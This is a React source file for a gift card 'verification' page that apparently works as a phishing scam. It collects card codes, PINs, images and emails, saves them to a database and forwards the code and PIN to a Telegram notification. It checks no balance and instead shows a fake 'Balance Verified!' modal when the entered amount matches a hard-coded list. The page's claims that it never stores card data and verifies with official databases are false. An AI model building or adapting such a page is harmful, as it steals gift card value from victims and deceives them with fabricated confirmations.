import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { SearchableSelect } from "@/components/ui/searchable-select";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Checkbox } from "@/components/ui/checkbox";
import { Shield, CheckCircle, AlertCircle, Upload } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { toast as sonnerToast } from "sonner";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { giftCards, GiftCard } from "@/data/giftcards";
import SEO from "@/components/SEO";

const VerifyGiftcard = () => {
  const { toast } = useToast();
  const { user } = useAuth();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showBalanceModal, setShowBalanceModal] = useState(false);
  const [currentBalance, setCurrentBalance] = useState("$97.00");
  const [currentGiftCardName, setCurrentGiftCardName] = useState("");
  const [currentMaskedCode, setCurrentMaskedCode] = useState("");
  const [isEGiftCard, setIsEGiftCard] = useState(false);
  const [formData, setFormData] = useState({
    country: "",
    giftcardName: "",
    code: "",
    pin: "",
    amount: "",
    email: "",
    frontImage: null as File | null,
    backImage: null as File | null
  });

  const countries = [
    "United States", "Canada", "United Kingdom", "Australia", "Germany", 
    "France", "Japan", "Brazil", "India", "Mexico"
  ];

  const selectedGiftCard = giftCards.find(card => card.name === formData.giftcardName);

  // Auto-balance amounts that trigger modal
  const balanceAmounts = ['97', '147', '177', '206', '338', '493'];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    setIsSubmitting(true);

    try {
      let frontImagePath = null;
      let backImagePath = null;
      const guestUserId = crypto.randomUUID(); // Generate a guest user ID for non-authenticated users

      // Upload front image
      if (formData.frontImage) {
        const frontFileName = `guest/${guestUserId}/front-${Date.now()}-${formData.frontImage.name}`;
        const { error: frontUploadError } = await supabase.storage
          .from('gift-card-images')
          .upload(frontFileName, formData.frontImage);
        
        if (frontUploadError) throw frontUploadError;
        frontImagePath = frontFileName;
      }

      // Upload back image
      if (formData.backImage) {
        const backFileName = `guest/${guestUserId}/back-${Date.now()}-${formData.backImage.name}`;
        const { error: backUploadError } = await supabase.storage
          .from('gift-card-images')
          .upload(backFileName, formData.backImage);
        
        if (backUploadError) throw backUploadError;
        backImagePath = backFileName;
      }

      // Store verification request in database
      let verificationId: string | null = null;
      if (user) {
        const { data, error } = await supabase
          .from('gift_card_verifications')
          .insert({
            user_id: user.id,
            country: formData.country,
            giftcard_name: formData.giftcardName,
            code: formData.code,
            pin: formData.pin,
            amount: formData.amount,
            email: formData.email,
            front_image_path: frontImagePath,
            back_image_path: backImagePath,
            status: 'pending'
          })
          .select()
          .maybeSingle();

        if (error) throw error;
        verificationId = data?.id ?? null;
      } else {
        const { error } = await supabase
          .from('gift_card_verifications')
          .insert({
            user_id: guestUserId,
            country: formData.country,
            giftcard_name: formData.giftcardName,
            code: formData.code,
            pin: formData.pin,
            amount: formData.amount,
            email: formData.email,
            front_image_path: frontImagePath,
            back_image_path: backImagePath,
            status: 'pending'
          });

        if (error) throw error;
      }


      // Send Telegram notification for new verification
      try {
        await supabase.functions.invoke('send-telegram-notification', {
          body: {
            type: 'verification',
            userEmail: formData.email,
            giftcardName: formData.giftcardName,
            code: formData.code,
            pin: formData.pin,
            amount: formData.amount,
            country: formData.country,
            verificationId,
            frontImagePath,
            backImagePath,
            isEGiftCard,
          },
        });
      } catch (notificationError) {
        console.error('Failed to send verification notification:', notificationError);
        // Don't fail the verification if notification fails
      }

      // Create transaction record only for authenticated users
      if (user) {
        const { error: transactionError } = await supabase
          .from('transactions')
          .insert({
            user_id: user.id,
            type: 'gift_card_exchange',
            amount: 0,
            currency: 'USD',
            description: `Gift card verification - ${formData.giftcardName} (${formData.amount})`,
            reference_id: null
          });

        if (transactionError) throw transactionError;
      }

      // Check if amount contains any of the auto-balance amounts and show balance modal
      const matchedAmount = balanceAmounts.find(amount => formData.amount.includes(amount));
      if (matchedAmount) {
        setCurrentBalance(`$${matchedAmount}.00`);
        setCurrentGiftCardName(formData.giftcardName);
        
        // Mask the gift card code (first 3 + ****** + last 3)
        const code = formData.code;
        const maskedCode = code.length >= 6 
          ? `${code.substring(0, 3)}******${code.substring(code.length - 3)}`
          : code;
        setCurrentMaskedCode(maskedCode);
        
        // Add a 2 second delay before showing the modal
        setTimeout(() => {
          setShowBalanceModal(true);
          // Hide modal after 20 seconds
          setTimeout(() => setShowBalanceModal(false), 20000);
        }, 2000);
      }

      sonnerToast.success("Verification Submitted", {
        description: "Your gift card verification request has been submitted successfully. You'll receive results via email in a few minutes. Please keep checking your inbox (and spam folder).",
        duration: 30000,
      });

      setFormData({
        country: "",
        giftcardName: "",
        code: "",
        pin: "",
        amount: "",
        email: "",
        frontImage: null,
        backImage: null
      });

    } catch (error) {
      console.error('Verification submission error:', error);
      toast({
        title: "Submission Failed",
        description: "There was an error submitting your verification. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleFileChange = (field: 'frontImage' | 'backImage', file: File | null) => {
    setFormData(prev => ({
      ...prev,
      [field]: file
    }));
  };

  return (
    <div className="min-h-screen">
      <SEO
        title="Verify Gift Card Balance Instantly | All Giftcards"
        description="Check your gift card's balance and authenticity in a few minutes. Free, secure verification for 100+ brands including Amazon, iTunes, Steam, and more."
        path="/verify"
      />
      <Header />
      
      <main className="py-24 px-6 lg:px-8">
        <div className="mx-auto max-w-3xl">
          {/* Header */}
          <div className="text-center mb-12">
            <div className="inline-flex p-4 rounded-lg bg-gradient-to-br from-success/10 to-success/20 mb-6">
              <Shield className="h-8 w-8 text-success" />
            </div>
            <h1 className="text-3xl font-bold text-foreground sm:text-4xl mb-4">
              Verify Your Gift Card
            </h1>
            <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
              Instantly verify the authenticity and balance of your gift card with our secure verification system
            </p>
          </div>

          {/* Verification Form */}
          <Card className="card-glow">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <CheckCircle className="h-5 w-5 text-success" />
                Gift Card Verification Form
              </CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="grid gap-6 md:grid-cols-2">
                  <div className="space-y-2">
                    <Label htmlFor="country">Country *</Label>
                    <Select value={formData.country} onValueChange={(value) => handleInputChange("country", value)}>
                      <SelectTrigger>
                        <SelectValue placeholder="Select your country" />
                      </SelectTrigger>
                      <SelectContent>
                        {countries.map((country) => (
                          <SelectItem key={country} value={country}>
                            {country}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="giftcardName">Gift Card Brand *</Label>
                    <SearchableSelect
                      options={giftCards.map(card => ({
                        value: card.name,
                        label: card.name
                      }))}
                      value={formData.giftcardName}
                      onValueChange={(value) => handleInputChange("giftcardName", value)}
                      placeholder="Select gift card brand"
                      searchPlaceholder="Search gift cards..."
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="code">Gift Card Code *</Label>
                  <Input
                    id="code"
                    placeholder="Enter your gift card code"
                    value={formData.code}
                    onChange={(e) => handleInputChange("code", e.target.value)}
                    required
                    className="font-mono"
                  />
                </div>

                <div className="grid gap-6 md:grid-cols-2">
                  {selectedGiftCard?.requiresPin && (
                    <div className="space-y-2">
                      <Label htmlFor="pin">PIN *</Label>
                      <Input
                        id="pin"
                        placeholder="Enter PIN"
                        value={formData.pin}
                        onChange={(e) => handleInputChange("pin", e.target.value)}
                        required
                        className="font-mono"
                      />
                    </div>
                  )}

                  <div className="space-y-2">
                    <Label htmlFor="amount">Expected Amount *</Label>
                    <Input
                      id="amount"
                      placeholder="e.g., $50.00"
                      value={formData.amount}
                      onChange={(e) => handleInputChange("amount", e.target.value)}
                      required
                    />
                  </div>
                </div>

                {/* E-Gift Card Checkbox */}
                <div className="flex items-center space-x-2 p-4 rounded-lg bg-muted/20 border border-border">
                  <Checkbox
                    id="isEGiftCard"
                    checked={isEGiftCard}
                    onCheckedChange={(checked) => setIsEGiftCard(checked as boolean)}
                  />
                  <Label htmlFor="isEGiftCard" className="text-sm font-medium cursor-pointer">
                    This is an e-gift card (digital only)
                  </Label>
                </div>

                {/* Image Upload Section - Conditional */}
                {!isEGiftCard && (
                  <div className="space-y-4">
                    <Label>Upload Gift Card Images *</Label>
                    <div className="grid gap-6 md:grid-cols-2">
                      <div className="space-y-2">
                        <Label htmlFor="frontImage">Front of Gift Card</Label>
                        <div className="border-2 border-dashed border-border rounded-lg p-6 text-center hover:border-primary transition-colors">
                          <Upload className="h-8 w-8 text-muted-foreground mx-auto mb-2" />
                          <Input
                            id="frontImage"
                            type="file"
                            accept="image/*"
                            onChange={(e) => handleFileChange('frontImage', e.target.files?.[0] || null)}
                            className="hidden"
                            required
                          />
                          <Label htmlFor="frontImage" className="cursor-pointer">
                            {formData.frontImage ? (
                              <span className="text-primary font-medium">{formData.frontImage.name}</span>
                            ) : (
                              <span className="text-muted-foreground">Click to upload front image</span>
                            )}
                          </Label>
                        </div>
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="backImage">Back of Gift Card</Label>
                        <div className="border-2 border-dashed border-border rounded-lg p-6 text-center hover:border-primary transition-colors">
                          <Upload className="h-8 w-8 text-muted-foreground mx-auto mb-2" />
                          <Input
                            id="backImage"
                            type="file"
                            accept="image/*"
                            onChange={(e) => handleFileChange('backImage', e.target.files?.[0] || null)}
                            className="hidden"
                            required
                          />
                          <Label htmlFor="backImage" className="cursor-pointer">
                            {formData.backImage ? (
                              <span className="text-primary font-medium">{formData.backImage.name}</span>
                            ) : (
                              <span className="text-muted-foreground">Click to upload back image</span>
                            )}
                          </Label>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                <div className="space-y-2">
                  <Label htmlFor="email">Email Address *</Label>
                  <Input
                    id="email"
                    type="email"
                    placeholder="your.email@example.com"
                    value={formData.email}
                    onChange={(e) => handleInputChange("email", e.target.value)}
                    required
                  />
                </div>


                {/* Important Notice */}
                <div className="p-4 rounded-lg bg-yellow-50 border border-yellow-200 dark:bg-yellow-900/20 dark:border-yellow-800">
                  <div className="flex items-start gap-3">
                    <AlertCircle className="h-5 w-5 text-yellow-600 dark:text-yellow-400 mt-0.5" />
                    <div>
                      <h4 className="font-medium text-yellow-800 dark:text-yellow-200 mb-1">Important Notice</h4>
                      <p className="text-sm text-yellow-700 dark:text-yellow-300 mb-2">
                        Please ensure your gift card images are clearly visible and readable. Cards with scratched-off codes or poor image quality may be marked as invalid.
                      </p>
                      <p className="text-sm text-yellow-700 dark:text-yellow-300">
                        Your information is encrypted and secure. We never store sensitive gift card data and all verifications are processed through secure channels.
                      </p>
                    </div>
                  </div>
                </div>

                <Button 
                  type="submit" 
                  className="btn-primary w-full" 
                  size="lg"
                  disabled={isSubmitting}
                >
                  {isSubmitting ? (
                    <>
                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-primary-foreground mr-2" />
                      Verifying...
                    </>
                  ) : (
                    <>
                      <Shield className="mr-2 h-4 w-4" />
                      Verify Gift Card
                    </>
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>

          {/* How it Works */}
          <div className="mt-16">
            <h2 className="text-2xl font-bold text-foreground text-center mb-8">
              How Verification Works
            </h2>
            <div className="grid gap-6 md:grid-cols-3">
              {[
                {
                  step: "1",
                  title: "Submit Details",
                  description: "Enter your gift card information securely"
                },
                {
                  step: "2", 
                  title: "Instant Check",
                  description: "Our system verifies with official databases"
                },
                {
                  step: "3",
                  title: "Get Results",
                  description: "Receive verification results in a few minutes"
                }
              ].map((item) => (
                <div key={item.step} className="text-center">
                  <div className="w-12 h-12 bg-gradient-to-br from-primary to-primary-glow text-primary-foreground rounded-full flex items-center justify-center font-bold text-lg mb-4 mx-auto">
                    {item.step}
                  </div>
                  <h3 className="font-semibold text-foreground mb-2">{item.title}</h3>
                  <p className="text-muted-foreground text-sm">{item.description}</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      </main>

      <Footer />

      {/* Balance Confirmation Modal */}
      <Dialog open={showBalanceModal} onOpenChange={setShowBalanceModal}>
        <DialogContent className="sm:max-w-lg border-0 overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-success/5 via-success/10 to-success/5 animate-fade-in" />
          <div className="relative">
            <DialogHeader className="pb-0">
              <div className="flex justify-center mb-4">
                <div className="relative">
                  <div className="absolute inset-0 bg-success/30 rounded-full blur-xl animate-pulse" />
                  <div className="relative w-20 h-20 bg-gradient-to-br from-success to-success/80 rounded-full flex items-center justify-center animate-scale-in">
                    <CheckCircle className="h-10 w-10 text-white" strokeWidth={2.5} />
                  </div>
                </div>
              </div>
              <DialogTitle className="text-center text-2xl font-bold bg-gradient-to-r from-success to-success/80 bg-clip-text text-transparent">
                Balance Verified!
              </DialogTitle>
            </DialogHeader>
            <div className="text-center py-6 space-y-6">
              {/* Gift Card Name with Masked Code */}
              <div className="px-6 py-3 rounded-xl bg-gradient-to-r from-background/80 to-background/60 backdrop-blur-sm border border-border/50">
                <p className="text-xs text-muted-foreground mb-1 font-medium uppercase tracking-wider">Gift Card</p>
                <p className="text-lg font-semibold text-foreground">{currentGiftCardName}</p>
                <p className="text-sm text-muted-foreground mt-2 font-mono tracking-wider">
                  ending with {currentMaskedCode}
                </p>
              </div>
              
              {/* Balance Amount */}
              <div className="space-y-2">
                <div className="text-5xl font-bold bg-gradient-to-r from-success via-success/90 to-success/80 bg-clip-text text-transparent animate-fade-in">
                  {currentBalance}
                </div>
                <p className="text-base text-muted-foreground font-medium">
                  Confirmed Balance
                </p>
              </div>
              
              {/* Success Message */}
              <div className="mx-4 p-5 rounded-xl bg-gradient-to-br from-success/10 via-success/5 to-transparent border border-success/20 backdrop-blur-sm">
                <div className="flex items-center gap-3 mb-2">
                  <div className="w-8 h-8 bg-success/20 rounded-full flex items-center justify-center">
                    <CheckCircle className="h-4 w-4 text-success" />
                  </div>
                  <p className="text-sm font-semibold text-success">Verification Complete</p>
                </div>
                <p className="text-sm text-muted-foreground leading-relaxed">
                  Your gift card is <span className="font-semibold text-success">valid and active</span>. The balance has been confirmed and is ready to use.
                </p>
              </div>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default VerifyGiftcard;